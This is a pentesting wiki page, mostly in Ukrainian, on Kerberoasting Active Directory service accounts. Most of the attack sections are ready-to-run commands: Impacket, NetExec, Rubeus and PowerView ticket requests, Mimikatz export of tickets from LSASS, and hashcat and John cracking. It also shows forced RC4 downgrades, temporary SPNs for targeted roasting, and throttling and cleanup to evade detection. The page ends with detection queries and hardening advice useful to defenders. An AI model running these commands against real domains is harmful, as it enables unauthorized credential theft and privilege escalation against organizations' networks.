# Kerberoast

{{#include ../../banners/hacktricks-training.md}}

## Kerberoast

Kerberoasting зосереджується на отриманні TGS-квитків, зокрема тих, що пов'язані зі службами, які працюють під обліковими записами користувачів в Active Directory (AD), за винятком облікових записів комп'ютерів. Шифрування цих квитків використовує ключі, що походять від паролів користувачів, що дозволяє проводити офлайн-атаки на відновлення облікових даних. Використання облікового запису користувача для служби позначається непорожнім ServicePrincipalName (SPN).

Будь-який автентифікований доменний користувач може запитувати TGS-квитки, отже не потрібні спеціальні привілеї.

### Ключові моменти

- Орієнтується на TGS-квитки служб, що працюють під обліковими записами користувачів (тобто облікові записи з встановленим SPN; не облікові записи комп'ютерів).
- Квитки шифруються ключем, похідним від пароля сервісного облікового запису, і можуть бути зламані офлайн.
- Не потрібні підвищені привілеї; будь-який автентифікований обліковий запис може запитувати TGS-квитки.

> [!WARNING]
> Більшість публічних інструментів віддають перевагу запиту сервісних квитків RC4-HMAC (etype 23), оскільки їх легше crack'ити, ніж AES. RC4 TGS-хеші починаються з `$krb5tgs$23$*`, AES128 — з `$krb5tgs$17$*`, а AES256 — з `$krb5tgs$18$*`. Проте багато середовищ переходять на AES-only. Не припускайте, що лише RC4 має значення.
> Також уникайте “spray-and-pray” roasting. Rubeus’ default kerberoast може опитувати й запитувати квитки для всіх SPN і є шумним. Спочатку перелічіть і націльтесь на цікаві principals.

### Секрети сервісних облікових записів та вартість криптооперацій Kerberos

Багато сервісів досі працюють під обліковими записами користувачів з ручним керуванням паролями. KDC шифрує сервісні квитки ключами, похідними від цих паролів, і передає шифртекст будь-якому автентифікованому principal, тому kerberoasting дає необмежену кількість офлайн-спроб без блокувань або телеметрії з боку DC. Режим шифрування визначає бюджет для розкриття паролів:

| Режим | Виведення ключа | Тип шифрування | Орієнтовна пропускна здатність RTX 5090* | Примітки |
| --- | --- | --- | --- | --- |
| AES + PBKDF2 | PBKDF2-HMAC-SHA1 with 4,096 iterations and a per-principal salt generated from the domain + SPN | etype 17/18 (`$krb5tgs$17$`, `$krb5tgs$18$`) | ~6.8 million guesses/s | Сіль ускладнює використання rainbow tables, але все ще дозволяє швидке зламування коротких паролів. |
| RC4 + NT hash | Single MD4 of the password (unsalted NT hash); Kerberos only mixes in an 8-byte confounder per ticket | etype 23 (`$krb5tgs$23$`) | ~4.18 **billion** guesses/s | ~1000× faster than AES; attackers force RC4 whenever `msDS-SupportedEncryptionTypes` permits it. |

*Benchmarks from Chick3nman as d in [Matthew Green's Kerberoasting analysis](https://blog.cryptographyengineering.com/2025/09/10/kerberoasting/).

RC4’s confounder only randomizes the keystream; it does not add work per guess. Unless service accounts rely on random secrets (gMSA/dMSA, machine accounts, or vault-managed strings), compromise speed is purely GPU budget. Enforcing AES-only etypes removes the billion-guesses-per-second downgrade, but weak human passwords still fall to PBKDF2.

### Атака

#### Linux
```bash
# Metasploit Framework
msf> use auxiliary/gather/get_user_spns

# Impacket — request and save roastable hashes (prompts for password)
GetUserSPNs.py -request -dc-ip <DC_IP> <DOMAIN>/<USER> -outputfile hashes.kerberoast
# With NT hash
GetUserSPNs.py -request -dc-ip <DC_IP> -hashes <LMHASH>:<NTHASH> <DOMAIN>/<USER> -outputfile hashes.kerberoast
# Target a specific user’s SPNs only (reduce noise)
GetUserSPNs.py -request-user <samAccountName> -dc-ip <DC_IP> <DOMAIN>/<USER>

# NetExec — LDAP enumerate + dump $krb5tgs$23/$17/$18 blobs with metadata
netexec ldap <DC_FQDN> -u <USER> -p <PASS> --kerberoast kerberoast.hashes

# kerberoast by @skelsec (enumerate and roast)
# 1) Enumerate kerberoastable users via LDAP
kerberoast ldap spn 'ldap+ntlm-password://<DOMAIN>\\<USER>:<PASS>@<DC_IP>' -o kerberoastable
# 2) Request TGS for selected SPNs and dump
kerberoast spnroast 'kerberos+password://<DOMAIN>\\<USER>:<PASS>@<DC_IP>' -t kerberoastable_spn_users.txt -o kerberoast.hashes
```
Багатофункціональні інструменти, що включають перевірки kerberoast:
```bash
# ADenum: https://github.com/SecuProject/ADenum
adenum -d <DOMAIN> -ip <DC_IP> -u <USER> -p <PASS> -c
```
#### Windows

- Перелічити kerberoastable users
```powershell
# Built-in
setspn.exe -Q */*   # Focus on entries where the backing object is a user, not a computer ($)

# PowerView
Get-NetUser -SPN | Select-Object serviceprincipalname

# Rubeus stats (AES/RC4 coverage, pwd-last-set years, etc.)
.\Rubeus.exe kerberoast /stats
```
- Technique 1: Запитати TGS і dump з пам'яті
```powershell
# Acquire a single service ticket in memory for a known SPN
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "<SPN>"  # e.g. MSSQLSvc/mgmt.domain.local

# Get all cached Kerberos tickets
klist

# Export tickets from LSASS (requires admin)
Invoke-Mimikatz -Command '"kerberos::list /export"'

# Convert to cracking formats
python2.7 kirbi2john.py .\some_service.kirbi > tgs.john
# Optional: convert john -> hashcat etype23 if needed
sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$*\1*$\2/' tgs.john > tgs.hashcat
```
- Техніка 2: Автоматизовані інструменти
```powershell
# PowerView — single SPN to hashcat format
Request-SPNTicket -SPN "<SPN>" -Format Hashcat | % { $_.Hash } | Out-File -Encoding ASCII hashes.kerberoast
# PowerView — all user SPNs -> CSV
Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\kerberoast.csv -NoTypeInformation

# Rubeus — default kerberoast (be careful, can be noisy)
.\Rubeus.exe kerberoast /outfile:hashes.kerberoast
# Rubeus — target a single account
.\Rubeus.exe kerberoast /user:svc_mssql /outfile:hashes.kerberoast
# Rubeus — target admins only
.\Rubeus.exe kerberoast /ldapfilter:'(admincount=1)' /nowrap
```
> [!WARNING]
> Запит TGS генерує Windows Security Event 4769 (запитано сервісний квиток Kerberos).

### OPSEC and AES-only environments

- Навмисно запитуйте RC4 для облікових записів без AES:
- Rubeus: `/rc4opsec` використовує tgtdeleg для перерахунку облікових записів без AES і запитує RC4 сервісні квитки.
- Rubeus: `/tgtdeleg` з kerberoast також ініціює RC4-запити, де це можливо.
- Roast облікові записи лише з AES замість мовчазного пропуску:
- Rubeus: `/aes` перераховує облікові записи з увімкненим AES і запитує AES сервісні квитки (etype 17/18).
- Якщо у вас вже є TGT (PTT або з .kirbi), можна використовувати `/ticket:<blob|path>` з `/spn:<SPN>` або `/spns:<file>` і пропустити LDAP.
- Цільове націлення, throttling та менше шуму:
- Використовуйте `/user:<sam>`, `/spn:<spn>`, `/resultlimit:<N>`, `/delay:<ms>` та `/jitter:<1-100>`.
- Фільтруйте за ймовірно слабкими паролями за допомогою `/pwdsetbefore:<MM-dd-yyyy>` (старі паролі) або націлюйте привілейовані OUs за допомогою `/ou:<DN>`.

Examples (Rubeus):
```powershell
# Kerberoast only AES-enabled accounts
.\Rubeus.exe kerberoast /aes /outfile:hashes.aes
# Request RC4 for accounts without AES (downgrade via tgtdeleg)
.\Rubeus.exe kerberoast /rc4opsec /outfile:hashes.rc4
# Roast a specific SPN with an existing TGT from a non-domain-joined host
.\Rubeus.exe kerberoast /ticket:C:\\temp\\tgt.kirbi /spn:MSSQLSvc/sql01.domain.local
```
### Cracking
```bash
# John the Ripper
john --format=krb5tgs --wordlist=wordlist.txt hashes.kerberoast

# Hashcat
# RC4-HMAC (etype 23)
hashcat -m 13100 -a 0 hashes.rc4 wordlist.txt
# AES128-CTS-HMAC-SHA1-96 (etype 17)
hashcat -m 19600 -a 0 hashes.aes128 wordlist.txt
# AES256-CTS-HMAC-SHA1-96 (etype 18)
hashcat -m 19700 -a 0 hashes.aes256 wordlist.txt
```
### Утримання доступу / Зловживання

Якщо ви контролюєте або можете змінити обліковий запис, ви можете зробити його kerberoastable, додавши SPN:
```powershell
Set-DomainObject -Identity <username> -Set @{serviceprincipalname='fake/WhateverUn1Que'} -Verbose
```
Понизити обліковий запис, щоб увімкнути RC4 і полегшити cracking (вимагає прав запису на цільовому об'єкті):
```powershell
# Allow only RC4 (value 4) — very noisy/risky from a blue-team perspective
Set-ADUser -Identity <username> -Replace @{msDS-SupportedEncryptionTypes=4}
# Mixed RC4+AES (value 28)
Set-ADUser -Identity <username> -Replace @{msDS-SupportedEncryptionTypes=28}
```
#### Targeted Kerberoast через GenericWrite/GenericAll над користувачем (тимчасовий SPN)

Якщо BloodHound показує, що ви контролюєте об’єкт користувача (наприклад, GenericWrite/GenericAll), ви можете надійно «targeted-roast» цього конкретного користувача, навіть якщо в нього наразі немає SPN:

- Додайте тимчасовий SPN до контрольованого облікового запису користувача, щоб зробити його roastable.
- Запросіть TGS-REP, зашифрований RC4 (etype 23), для цього SPN, щоб полегшити cracking.
- Crack хеш `$krb5tgs$23$...` за допомогою hashcat.
- Видаліть SPN, щоб зменшити слід.

Windows (PowerView/Rubeus):
```powershell
# Add temporary SPN on the target user
Set-DomainObject -Identity <targetUser> -Set @{serviceprincipalname='fake/TempSvc-<rand>'} -Verbose

# Request RC4 TGS for that user (single target)
.\Rubeus.exe kerberoast /user:<targetUser> /nowrap /rc4

# Remove SPN afterwards
Set-DomainObject -Identity <targetUser> -Clear serviceprincipalname -Verbose
```
Коротка однорядкова команда для Linux (targetedKerberoast.py автоматизує додавання SPN -> запит TGS (etype 23) -> видалення SPN):
```bash
targetedKerberoast.py -d '<DOMAIN>' -u <WRITER_SAM> -p '<WRITER_PASS>'
```
Зламайте вивід за допомогою hashcat autodetect (mode 13100 for `$krb5tgs$23$`):
```bash
hashcat <outfile>.hash /path/to/rockyou.txt
```
Detection notes: додавання/видалення SPN призводить до змін у директорії (Event ID 5136/4738 для цільового користувача), а запит TGS генерує Event ID 4769. Розгляньте обмеження частоти запитів і швидке очищення.

You can find useful tools for kerberoast attacks here: https://github.com/nidem/kerberoast

If you find this error from Linux: `Kerberos SessionError: KRB_AP_ERR_SKEW (Clock skew too great)` it’s due to local time skew. Sync to the DC:

- `ntpdate <DC_IP>` (застаріло в деяких дистрибутивах)
- `rdate -n <DC_IP>`

### Kerberoast без доменного облікового запису (AS-requested STs)

У вересні 2022 року Charlie Clark показав, що якщо principal не вимагає pre-authentication, можна отримати service ticket через сформований KRB_AS_REQ, змінивши sname у тілі запиту — фактично отримавши service ticket замість TGT. Це віддзеркалює AS-REP roasting і не потребує дійсних доменних облікових даних.

See details: Semperis write-up “New Attack Paths: AS-requested STs”.

> [!WARNING]
> Ви повинні надати список користувачів, оскільки без дійсних облікових даних ви не можете опитувати LDAP за допомогою цієї техніки.

Linux

- Impacket (PR #1413):
```bash
GetUserSPNs.py -no-preauth "NO_PREAUTH_USER" -usersfile users.txt -dc-host dc.domain.local domain.local/
```
Windows

- Rubeus (PR #139):
```powershell
Rubeus.exe kerberoast /outfile:kerberoastables.txt /domain:domain.local /dc:dc.domain.local /nopreauth:NO_PREAUTH_USER /spn:TARGET_SERVICE
```
Пов'язане

Якщо ви націлені на AS-REP roastable users, див. також:

{{#ref}}
asreproast.md
{{#endref}}

### Виявлення

Kerberoasting може бути непомітним. Шукайте Event ID 4769 на DCs та застосуйте фільтри, щоб зменшити шум:

- Виключайте service name `krbtgt` та service names, що закінчуються на `$` (облікові записи комп'ютерів).
- Виключайте запити від машинних облікових записів (`*$$@*`).
- Тільки успішні запити (Failure Code `0x0`).
- Відстежуйте типи шифрування: RC4 (`0x17`), AES128 (`0x11`), AES256 (`0x12`). Не сповіщайте лише за `0x17`.

Приклад триажу PowerShell:
```powershell
Get-WinEvent -FilterHashtable @{Logname='Security'; ID=4769} -MaxEvents 1000 |
Where-Object {
($_.Message -notmatch 'krbtgt') -and
($_.Message -notmatch '\$$') -and
($_.Message -match 'Failure Code:\s+0x0') -and
($_.Message -match 'Ticket Encryption Type:\s+(0x17|0x12|0x11)') -and
($_.Message -notmatch '\$@')
} |
Select-Object -ExpandProperty Message
```
Додаткові ідеї:

- Встановіть базовий рівень нормального використання SPN для кожного хоста/користувача; створюйте сповіщення при великих сплесках запитів різних SPN від одного принципалу.
- Відмічайте незвичне використання RC4 у доменах, захищених AES.

### Пом'якшення / Укріплення

- Використовуйте gMSA/dMSA або машинні акаунти для сервісів. Керовані акаунти мають випадкові паролі довжиною 120+ символів і автоматично обертаються, що робить offline cracking непрактичним.
- Примусово використовуйте AES для сервісних акаунтів, встановивши `msDS-SupportedEncryptionTypes` в AES-only (decimal 24 / hex 0x18), а потім змінивши пароль, щоб були виведені AES-ключі.
- За можливості вимкніть RC4 у вашому середовищі та моніторте спроби використання RC4. На DCs можете використовувати реєстрове значення `DefaultDomainSupportedEncTypes` щоб задавати значення за замовчуванням для акаунтів, у яких не встановлено `msDS-SupportedEncryptionTypes`. Ретельно тестуйте.
- Видаліть зайві SPN з облікових записів користувачів.
- Використовуйте довгі випадкові паролі для сервісних акаунтів (25+ символів), якщо керовані акаунти неможливі; забороняйте поширені паролі та регулярно проводьте аудит.

## Джерела

- [HTB: Breach – NetExec LDAP kerberoast + hashcat cracking in practice](https://0xdf.gitlab.io/2026/02/10/htb-breach.html)
- [https://github.com/ShutdownRepo/targetedKerberoast](https://github.com/ShutdownRepo/targetedKerberoast)
- [Matthew Green – Kerberoasting: Low-Tech, High-Impact Attacks from Legacy Kerberos Crypto (2025-09-10)](https://blog.cryptographyengineering.com/2025/09/10/kerberoasting/)
- [https://www.tarlogic.com/blog/how-to-attack-kerberos/](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1208-kerberoasting](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1208-kerberoasting)
- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberoasting-requesting-rc4-encrypted-tgs-when-aes-is-enabled](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberoasting-requesting-rc4-encrypted-tgs-when-aes-is-enabled)
- [Microsoft Security Blog (2024-10-11) – Microsoft’s guidance to help mitigate Kerberoasting](https://www.microsoft.com/en-us/security/blog/2024/10/11/microsofts-guidance-to-help-mitigate-kerberoasting/)
- [SpecterOps – Rubeus Roasting documentation](https://docs.specterops.io/ghostpack/rubeus/roasting)
- [HTB: Delegate — SYSVOL creds → Targeted Kerberoast → Unconstrained Delegation → DCSync to DA](https://0xdf.gitlab.io/2025/09/12/htb-delegate.html)

{{#include ../../banners/hacktricks-training.md}}
